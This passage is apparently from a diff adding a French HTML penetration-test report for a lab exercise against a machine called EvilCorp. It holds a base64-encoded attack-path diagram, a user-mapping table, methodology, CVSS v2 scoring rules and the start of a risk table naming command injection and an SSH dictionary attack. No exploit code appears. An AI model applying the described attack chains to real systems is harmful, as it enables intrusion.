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" alt="Schéma des chemins d’exploitation EvilCorp">
+    <h3>Correspondance des nœuds</h3>
+    <table class="mapping-table">
+      <tr><td>You</td><td>Machine d’attaque / Kali</td></tr>
+      <tr><td>User W</td><td>www-data</td></tr>
+      <tr><td>User J</td><td>John</td></tr>
+      <tr><td>User A</td><td>Alice</td></tr>
+      <tr><td>User B</td><td>Bob</td></tr>
+      <tr><td>User R</td><td>Root</td></tr>
+    </table>
+  </section>
+
+  <section class="page-break">
+    <div class="section-tag">03 · MÉTHODOLOGIE</div>
+    <h2>Méthodologie et scoring</h2>
+    <ol class="method-list">
+      <li>Reconnaissance des services exposés et identification des surfaces d’attaque.</li>
+      <li>Validation manuelle des vulnérabilités et conservation des commandes reproductibles.</li>
+      <li>Énumération post-exploitation depuis chaque identité compromise.</li>
+      <li>Construction des chaînes menant aux privilèges Root.</li>
+      <li>Évaluation CVSS v2 de chaque vulnérabilité isolée.</li>
+    </ol>
+    <h3>Convention CVSS v2</h3>
+    <p>Le score présenté est le score de base CVSS v2. Il mesure les propriétés intrinsèques de chaque vulnérabilité et non la gravité cumulée de toute la chaîne. Les vecteurs d’accès sont fixés à <code>AV:N</code> conformément au contexte du TP, dans lequel la cible <code>10.10.10.83</code> est considérée comme distante.</p>
+    <table>
+      <tr><th>Plage</th><th>Niveau</th><th>Interprétation</th></tr>
+      <tr><td>0,0</td><td>Nul</td><td>Aucun impact calculé</td></tr>
+      <tr><td>0,1 à 3,9</td><td class="risk-low">Faible</td><td>Risque intrinsèque limité</td></tr>
+      <tr><td>4,0 à 6,9</td><td class="risk-medium">Modéré</td><td>Risque significatif</td></tr>
+      <tr><td>7,0 à 10,0</td><td class="risk-high">Élevé</td><td>Risque majeur nécessitant une correction prioritaire</td></tr>
+    </table>
+    <p class="footer-note">Référence : FIRST — Common Vulnerability Scoring System v2.0, https://www.first.org/cvss/v2/guide</p>
+  </section>
+
+  <section class="page-break">
+    <div class="section-tag">04 · SYNTHÈSE DES RISQUES</div>
+    <h2>Tableau de synthèse</h2>
+    <table class="summary-table">
+      <thead><tr><th>ID</th><th>Vulnérabilité</th><th>Chemin</th><th>CVSS</th><th>Risque</th><th>Statut</th></tr></thead>
+      <tbody>
+      <tr>
+        <td><strong>VULN 01</strong></td>
+        <td>Command Injection</td>
+        <td>Kali → User W / www-data</td>
+        <td>7,5</td>
+        <td class="risk-high">Élevé</td>
+        <td>Confirmée</td>
+      </tr>
+      <tr>
+        <td><strong>VULN 02</strong></td>
+        <td>Attaque par dictionnaire SSH</td>
